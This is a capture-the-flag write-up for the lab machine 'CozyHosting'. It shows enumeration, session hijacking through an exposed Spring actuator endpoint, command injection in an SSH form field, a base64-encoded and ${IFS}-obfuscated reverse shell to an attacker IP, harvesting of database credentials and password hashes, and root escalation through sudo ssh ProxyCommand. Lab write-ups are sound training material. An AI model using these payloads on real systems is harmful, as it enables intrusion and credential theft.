# CozyHosting

# Ports

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
8083/tcp open  us-srv

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

# Gobuster

```
\u276f gobuster dir -w ~/Documents/wordlists/seclists/Discovery/Web-Content/common.txt --url http://cozyhosting.htb
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cozyhosting.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/freckles/Documents/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/09/22 16:02:29 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 401) [Size: 97]
/error                (Status: 500) [Size: 73]
/index                (Status: 200) [Size: 12706]
/login                (Status: 200) [Size: 4431]
/logout               (Status: 204) [Size: 0]
/render/https://www.google.com (Status: 200) [Size: 0]
Progress: 4477 / 4724 (94.77%)
===============================================================
2023/09/22 16:02:39 Finished
===============================================================
```

# Java / jakarta

Running java and `/actuator` is quite open

Using `/actuator/sessions` we can get the open sessions and hijack the
_kanderson_ session.

```
{
   "87AE040E4612F5D43A3C6076019903AD" : "kanderson"
}
```

This gives us access to the admin page which contains an endpoint for
`executessh`
```
POST /executessh 
Content-Type: url-formencoded

host: ""
username: ""
```

# Shell

It seems the username is exploitable with shell injection. 
```
http://cozyhosting.htb/admin?error=
usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface]           
[-b bind_address] [-c cipher_spec] [-D [bind_address:]port]           
[-E log_file] [-e escape_char] [-F configfile] [-I pkcs11]           
[-i identity_file] [-J [user@]host[:port]] [-L address]           
[-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]           
[-Q query_option] [-R address] [-S ctl_path] [-W host:port]           
[-w local_tun[:remote_tun]] destination [command [argument ...]]/bin/bash: line 1: ${IFS}/dev/tcp/10.10.14.119/9001${IFS}0: ambiguous redirect
```

```bash
echo 'bash -i >& /dev/tcp/10.10.14.119/9001 0>&1' | base64 -w 0;
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTkvOTAwMSAwPiYxCg==

# Payload
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTkvOTAwMSAwPiYxCg==" | base64 -d | bash

# Sanitizing for upload with ${IFS} to replace spaces
# ;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTkvOTAwMSAwPiYxCg=="${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
```

### Shell next

Besides finding the `josh` user we dont find a lot with the shell, no home 
folder no sudo rights etc. etc.. What we can do is download the jar file. With 
spring there should be an application.properties file.

Found it
```
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

# Postgres

Login in to the database we find the following:
```
cozyhosting-# \d
WARNING: terminal is not fully functional
Press RETURN to continue
              List of relations
 Schema |     Name     |   Type   |  Owner
--------+--------------+----------+----------
 public | hosts        | table    | postgres
 public | hosts_id_seq | sequence | postgres
 public | users        | table    | postgres
```

```
Press RETURN to continue
   name    |                           password                           | role

-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
```

> For completionists sake
```
cozyhosting=# select * from hosts;
WARNING: terminal is not fully functional
Press RETURN to continue
 id | username  |      hostname
----+-----------+--------------------
  1 | kanderson | suspicious mcnulty
  5 | kanderson | boring mahavira
  6 | kanderson | stoic varahamihira
  7 | kanderson | awesome lalande
```

# Password cracking

With the rockyou wordlist we find a password for the admin hash, `manchesterunited`. 
Using this password for the previous discover _josh_ user we can now login via SSH.

# Privilege escalation

Executing `sudo -l` gives us

```
josh@cozyhosting:~$ sudo -l
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

Using _gtfobins_ we find that this can be used to gain a root shell using `sudo
ssh -o ProxyCommand=';sh 0<&2 1>&2' -x`. Using the root password of
`manchesterunited` again we now have a root shell.
